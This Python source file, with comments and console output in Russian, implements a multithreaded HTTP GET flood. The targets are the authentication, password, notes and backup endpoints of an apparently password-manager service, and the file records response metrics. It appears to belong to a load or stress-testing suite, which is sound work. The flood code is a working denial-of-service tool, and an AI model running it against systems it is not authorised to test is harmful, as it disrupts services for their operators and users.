import requests
import threading
import time
import random
import os
from colorama import Fore, Style, init
from utils.metrics import metrics_collector
from utils.test_data import test_data_generator

# Инициализация colorama для цветного вывода
init(autoreset=True)

class HttpFloodAttack:
    """Класс для выполнения HTTP Flood (GET) атаки"""
    
    def __init__(self, target_url: str, threads: int = 10, requests_per_thread: int = 100):
        self.target_url = target_url
        self.threads = threads
        self.requests_per_thread = requests_per_thread
        self.running = False
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # Эндпоинты для атаки
        self.endpoints = [
            "/auth/health",
            "/auth/register", 
            "/auth/login",
            "/auth/sync-setup",
            "/auth/verify-otp",
            "/auth/initiate-recovery",
            "/auth/cloud-login",
            "/api/passwords",
            "/api/notes", 
            "/api/backup/export"
        ]
    
    def attack_thread(self, thread_id: int):
        """Функция для выполнения атаки в отдельном потоке"""
        print(f"{Fore.YELLOW}🚀 Поток {thread_id} запущен")
        
        for i in range(self.requests_per_thread):
            if not self.running:
                break
                
            try:
                # Выбираем случайный эндпоинт
                endpoint = random.choice(self.endpoints)
                url = self.target_url + endpoint
                
                # Генерируем случайные заголовки
                headers = test_data_generator.get_random_headers()
                headers["Content-Type"] = "application/json"
                
                # Добавляем случайные параметры для GET запросов
                params = {}
                if random.choice([True, False]):
                    params = {
                        "page": random.randint(1, 10),
                        "size": random.randint(10, 100),
                        "sort": random.choice(["asc", "desc"]),
                        "filter": random.choice(["all", "active", "inactive"])
                    }
                
                start_time = time.time()
                
                # Выполняем GET запрос
                response = requests.get(
                    url, 
                    headers=headers,
                    params=params,
                    timeout=5
                )
                
                end_time = time.time()
                response_time = end_time - start_time
                
                # Собираем метрики
                metrics_collector.add_metric(
                    response_time=response_time,
                    status_code=response.status_code,
                    size=len(response.content),
                    attack_type="HTTP_FLOOD",
                    endpoint=endpoint
                )
                
                self.total_requests += 1
                if response.status_code < 400:
                    self.successful_requests += 1
                    print(f"{Fore.GREEN}✅ [{thread_id}] {response.status_code} {endpoint} ({response_time:.3f}s)")
                else:
                    self.failed_requests += 1
                    print(f"{Fore.RED}❌ [{thread_id}] {response.status_code} {endpoint} ({response_time:.3f}s)")
                
                # Небольшая случайная задержка между запросами
                time.sleep(random.uniform(0.01, 0.1))
                
            except requests.exceptions.Timeout:
                metrics_collector.add_metric(
                    response_time=5.0,
                    status_code=0,
                    size=0,
                    attack_type="HTTP_FLOOD",
                    endpoint=endpoint,
                    error="Timeout"
                )
                self.failed_requests += 1
                print(f"{Fore.YELLOW}⏱️  [{thread_id}] Timeout {endpoint}")
                
            except requests.exceptions.ConnectionError:
                metrics_collector.add_metric(
                    response_time=0,
                    status_code=0,
                    size=0,
                    attack_type="HTTP_FLOOD",
                    endpoint=endpoint,
                    error="Connection Error"
                )
                self.failed_requests += 1
                print(f"{Fore.RED}🔌 [{thread_id}] Connection Error {endpoint}")
                
            except Exception as e:
                metrics_collector.add_metric(
                    response_time=0,
                    status_code=0,
                    size=0,
                    attack_type="HTTP_FLOOD",
                    endpoint=endpoint,
                    error=str(e)
                )
                self.failed_requests += 1
                print(f"{Fore.RED}💥 [{thread_id}] Error: {str(e)}")
        
        print(f"{Fore.BLUE}🏁 Поток {thread_id} завершен")
    
    def run(self):
        """Запуск HTTP Flood атаки"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}🌊 ЗАПУСК HTTP FLOOD АТАКИ")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.WHITE}Цель: {self.target_url}")
        print(f"{Fore.WHITE}Потоков: {self.threads}")
        print(f"{Fore.WHITE}Запросов на поток: {self.requests_per_thread}")
        print(f"{Fore.WHITE}Общее количество запросов: {self.threads * self.requests_per_thread}")
        print(f"{Fore.WHITE}Эндпоинты: {', '.join(self.endpoints[:3])}...")
        print(f"{Fore.CYAN}{'='*60}")
        
        # Очищаем предыдущие метрики
        metrics_collector.clear()
        
        self.running = True
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # Создаем и запускаем потоки
        threads = []
        start_time = time.time()
        
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_thread, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            # Ждем завершения всех потоков
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⏹️  Атака прервана пользователем")
            self.running = False
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Выводим итоговую статистику
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}📊 РЕЗУЛЬТАТЫ HTTP FLOOD АТАКИ")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.WHITE}Время выполнения: {duration:.2f} секунд")
        print(f"{Fore.WHITE}Общих запросов: {self.total_requests}")
        print(f"{Fore.GREEN}Успешных: {self.successful_requests}")
        print(f"{Fore.RED}Неудачных: {self.failed_requests}")
        
        if duration > 0:
            rps = self.total_requests / duration
            print(f"{Fore.YELLOW}Запросов в секунду: {rps:.2f}")
        
        print(f"{Fore.CYAN}{'='*60}")
        
        # Сохраняем метрики
        timestamp = int(time.time())
        csv_filename = f"metrics/http_flood_{timestamp}.csv"
        metrics_collector.save_to_csv(csv_filename)
        metrics_collector.print_stats()
        
        return csv_filename


def run(target_url: str, threads: int = 10, requests_per_thread: int = 100):
    """Функция для запуска HTTP Flood атаки (совместимость с меню)"""
    attack = HttpFloodAttack(target_url, threads, requests_per_thread)
    return attack.run() 